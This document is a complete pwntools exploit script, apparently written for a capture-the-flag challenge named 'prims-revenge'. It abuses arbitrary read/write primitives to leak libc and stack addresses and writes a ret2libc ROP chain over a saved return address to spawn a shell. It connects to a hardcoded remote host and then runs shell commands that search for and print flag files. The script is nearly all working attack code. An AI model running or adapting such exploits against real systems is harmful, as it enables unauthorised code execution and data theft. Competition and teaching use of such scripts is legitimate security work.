#!/usr/bin/env python3
# prims-revenge exploit
# Arbitrary read/write primitives. Full RELRO + Canary + NX + No PIE.
# Plan: leak libc via puts@GOT, leak stack via environ, locate menu's saved RIP
# (0x4013fe) on the stack, then write a ret2libc ROP chain there 8 bytes at a
# time. When menu returns, it triggers system("/bin/sh").
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = args.get('HOST', '45.77.247.35')
PORT = int(args.get('PORT', 22020))

# --- libc offsets (Ubuntu GLIBC 2.39) ---
OFF_PUTS    = 0x87cc0
OFF_SYSTEM  = 0x58750
OFF_BINSH   = 0x1cc42f
OFF_ENVIRON = 0x20bd58
OFF_POP_RDI = 0x10c08d   # pop rdi ; ret
OFF_RET     = 0x10c08e   # ret (byte after pop rdi)

MENU_RIP_VAL = 0x4013fe  # main's `jmp 4013f9` -> menu's saved return address

def arbread(r, addr):
    r.send(b'1\n')
    r.recvuntil(b'[?] address > ')
    r.send(p64(addr))
    r.recvuntil(b'[!] arbread: ')
    h = r.recvn(16)
    r.recvuntil(b'option > ')
    return u64(bytes.fromhex(h.decode()))

def arbwrite(r, addr, data, trigger=False):
    r.send(b'2\n')
    r.recvuntil(b'[?] address > ')
    r.send(p64(addr))
    r.recvuntil(b'[?] write > ')
    r.send(data)
    r.recvuntil(b'arbwrite done!')
    if not trigger:
        r.recvuntil(b'option > ')

def exploit():
    r = remote(HOST, PORT)
    r.recvuntil(b'option > ')

    # 1. leak libc base via puts@GOT
    puts = arbread(r, 0x403fb8)
    libc_base = puts - OFF_PUTS
    log.info(f'puts      = {hex(puts)}')
    log.info(f'libc base  = {hex(libc_base)}')

    # sanity check with printf@GOT
    printf_addr = arbread(r, 0x403fd0)
    log.info(f'printf GOT = {hex(printf_addr)} (expect {hex(libc_base + 0x60100)})')
    assert libc_base + 0x60100 == printf_addr, 'libc base mismatch!'

    # 2. leak stack via environ
    environ_val = arbread(r, libc_base + OFF_ENVIRON)
    log.info(f'environ    = {hex(environ_val)}')

    # 3. scan down from environ for menu's saved RIP (0x4013fe)
    menu_rip = None
    for off in range(0x80, 0x200, 8):
        cand = environ_val - off
        val = arbread(r, cand)
        if val == MENU_RIP_VAL:
            menu_rip = cand
            log.info(f'menu_rip   = {hex(menu_rip)} (environ - {hex(off)})')
            break
    assert menu_rip is not None, 'menu saved RIP not found on stack!'

    # 4. build ROP chain: system("/bin/sh")
    pop_rdi = libc_base + OFF_POP_RDI
    ret     = libc_base + OFF_RET
    system  = libc_base + OFF_SYSTEM
    binsh   = libc_base + OFF_BINSH

    # ABI alignment: a normally `call`ed function enters with rsp%16==8
    # (call pushes 8 onto a 16-aligned rsp). We `ret` into system, so we must
    # make rsp%16==8 at system's entry. ret pops 8 bytes, so it flips parity.
    #   no-ret chain: system entry rsp = menu_rip+24  (need menu_rip%16==0)
    #   ret chain:    system entry rsp = menu_rip+32  (need menu_rip%16==8)
    if menu_rip % 16 == 8:
        log.info(f'menu_rip%16==8 -> using alignment ret chain')
        chain = [(0, ret), (8, pop_rdi), (16, binsh), (24, system)]
    else:
        log.info(f'menu_rip%16==0 -> no alignment ret needed')
        chain = [(0, pop_rdi), (8, binsh), (16, system)]

    # Write the chain 8 bytes at a time. Write the trigger slot (offset 0) LAST,
    # because overwriting menu's saved RIP is what activates the chain when menu
    # returns after the arbwrite. Other slots are in main's frame and persist
    # across menu loop iterations.
    chain_sorted = sorted(chain, key=lambda x: -x[0])  # offset 0 last
    for i, (off, val) in enumerate(chain_sorted):
        log.info(f'writing {hex(val)} -> {hex(menu_rip + off)}')
        is_trigger = (off == 0) and (i == len(chain_sorted) - 1)
        arbwrite(r, menu_rip + off, p64(val), trigger=is_trigger)

    # menu should now return into our chain -> shell
    log.success('ROP chain written, shell should be spawned')
    import time, re
    time.sleep(0.5)
    out = b''
    def send_and_recv(cmd, t=1.5):
        nonlocal out
        try:
            r.sendline(cmd)
        except Exception:
            return
        time.sleep(0.2)
        try:
            d = r.recv(timeout=t)
            if d: out += d
        except Exception:
            pass
    send_and_recv(b'id; echo MARK1; ls -la /app 2>/dev/null; echo "---"; find / -maxdepth 4 -name "flag*" 2>/dev/null; find / -maxdepth 4 -iname "*flag*" -type f 2>/dev/null | head -50; echo MARK2')
    send_and_recv(b'cat /app/flag* /app/*.txt /flag* 2>/dev/null; ls -la /app 2>/dev/null')
    print('====SHELL OUTPUT====')
    print(out.decode(errors='replace'))
    print('====END====')
    flags = re.findall(rb'CYBLTZ2026\{[^}]*\}', out)
    if flags:
        log.success(f'FLAG FOUND: {flags[0].decode()}')
    else:
        log.warning('no flag yet; dumping everything found')
        # try harder
        send_and_recv(b'find / -name "flag*" 2>/dev/null; cat /home/ctf/flag* 2>/dev/null; grep -rl CYBLTZ2026 / 2>/dev/null | head')
        print('====EXTRA====')
        print(out.decode(errors='replace'))
        flags = re.findall(rb'CYBLTZ2026\{[^}]*\}', out)
        if flags:
            log.success(f'FLAG FOUND: {flags[0].decode()}')
    if args.get('I'):
        r.interactive()
    else:
        r.close()

if __name__ == '__main__':
    exploit()
